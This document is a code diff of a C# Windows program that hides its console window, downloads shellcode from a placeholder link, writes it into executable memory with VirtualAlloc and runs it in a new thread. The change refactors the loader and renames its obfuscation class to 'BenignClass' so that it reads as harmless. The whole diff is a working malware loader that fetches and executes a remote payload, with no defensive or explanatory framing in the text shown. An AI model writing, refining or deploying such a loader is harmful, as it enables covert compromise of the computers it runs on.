@@ -2,53 +2,35 @@ using System;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Reflection;
+using System.Threading;
 
 class Program
 {
     static void Main(string[] args)
     {
-        HideConsoleWindow();
-        byte[] shellcode = DownloadShellcode("[DOWNLOAD_LINK]");
-        IntPtr memory = AllocateMemory(shellcode.Length);
-        CopyShellcodeToMemory(shellcode, memory);
-        ExecuteShellcode(memory);
-        ObfuscateExecution();
-    }
-
-    static void HideConsoleWindow()
-    {
+        // Hide the console window
         var handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
-    }
 
-    static byte[] DownloadShellcode(string url)
-    {
+        // Download shellcode
         WebClient wc = new WebClient();
-        return wc.DownloadData(url);
-    }
+        byte[] shellcode = wc.DownloadData("[DOWNLOAD_LINK]");
 
-    static IntPtr AllocateMemory(int size)
-    {
-        IntPtr kernel32 = LoadLibrary("kernel32.dll");
-        IntPtr virtualAllocAddr = GetProcAddress(kernel32, "VirtualAlloc");
-        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocAddr, typeof(VirtualAllocDelegate));
-        return virtualAlloc(IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
-    }
+        // Allocate memory and copy shellcode
+        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
 
-    static void CopyShellcodeToMemory(byte[] shellcode, IntPtr memory)
-    {
-        Marshal.Copy(shellcode, 0, memory, shellcode.Length);
-    }
-
-    static void ExecuteShellcode(IntPtr memory)
-    {
-        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, memory, IntPtr.Zero, 0, IntPtr.Zero);
+        // Create thread to execute shellcode
+        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
         WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+        // Call a random method to obfuscate further
+        CallRandomMethod();
     }
 
-    static void ObfuscateExecution()
+    static void CallRandomMethod()
     {
-        MethodInfo[] methods = typeof(ObfuscationClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
+        MethodInfo[] methods = typeof(BenignClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
         Random rand = new Random();
         int index = rand.Next(methods.Length);
         methods[index].Invoke(null, null);
@@ -67,6 +49,9 @@ class Program
     private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
     [DllImport("kernel32.dll")]
+    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+    [DllImport("kernel32.dll")]
     static extern IntPtr GetConsoleWindow();
 
     [DllImport("user32.dll")]
@@ -74,8 +59,6 @@ class Program
 
     private const int SW_HIDE = 0;
     private const int SW_SHOW = 5;
-
-    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
     [Flags]
     enum AllocationType
@@ -91,20 +74,20 @@ class Program
     }
 }
 
-class ObfuscationClass
+class BenignClass
 {
-    public static void Obfuscate1()
+    public static void Methodexecuted1()
     {
-        Console.WriteLine("Obfuscate method 1 executed.");
+        Console.WriteLine("Method1 is executed.");
     }
 
-    public static void Obfuscate2()
+    public static void Methodexecuted2()
     {
-        Console.WriteLine("Obfuscate method 2 executed.");
+        Console.WriteLine("Method2 are executed.");
     }
 
-    public static void Obfuscate3()
+    public static void Methodexecuted3()
     {
-        Console.WriteLine("Obfuscate method 3 executed.");
+        Console.WriteLine("Method3 had executed.");
     }
 }
